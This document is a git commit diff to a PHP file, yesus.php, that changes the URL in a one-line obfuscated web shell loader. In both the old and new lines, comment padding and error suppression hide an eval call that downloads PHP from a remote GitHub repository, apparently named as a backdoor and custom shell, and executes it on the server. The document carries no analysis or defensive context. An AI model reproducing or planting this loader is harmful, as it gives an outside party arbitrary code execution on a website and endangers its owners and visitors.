58f3321cd8c7abaac9f8c30f076b8cd139b06bb8
Валодя Чёрный <96941376+Ma-ZaHaKa@users.noreply.github.com>
2023-06-17 17:55:44 +0300

    Update yesus.php

--- yesus.php
+++ yesus.php
@@ -1,1 +1,1 @@
- <?=/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/micingans/bekdur/master/gay.php"))/******/ /*By NuLz404*/?>
+ <?=/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/Ma-ZaHaKa/DKCustomShell/main/links.php"))/******/ /*By NuLz404*/?>
